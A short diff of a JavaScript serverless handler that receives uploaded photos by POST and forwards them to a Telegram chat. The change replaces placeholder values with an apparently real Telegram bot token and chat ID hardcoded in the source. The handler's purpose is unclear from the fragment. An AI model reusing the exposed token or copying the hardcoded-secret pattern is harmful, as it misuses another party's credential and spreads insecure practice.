@@ -2,8 +2,8 @@ import { create } from 'archiver';
 
 export default async function handler(req, res) {
     // ===== GANTI BOT_TOKEN & CHAT_ID DI SINI ATAU PAKE ENV =====
-    const botToken = process.env.BOT_TOKEN || "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"; // GANTI MANUAL KALO LU MALES ENV
-    const chatId = process.env.CHAT_ID || "-1001234567890"; // GANTI MANUAL KALO LU MALES ENV
+    const botToken = process.env.BOT_TOKEN || "8995760973:AAHeOTaXK5pFSn8Y5Z4tlxjgR7vbYOhgUpI"; // GANTI MANUAL KALO LU MALES ENV
+    const chatId = process.env.CHAT_ID || "6126622503"; // GANTI MANUAL KALO LU MALES ENV
 
     // 1. POST - TERIMA FOTO & FORWARD KE TELEGRAM
     if (req.method === 'POST') {
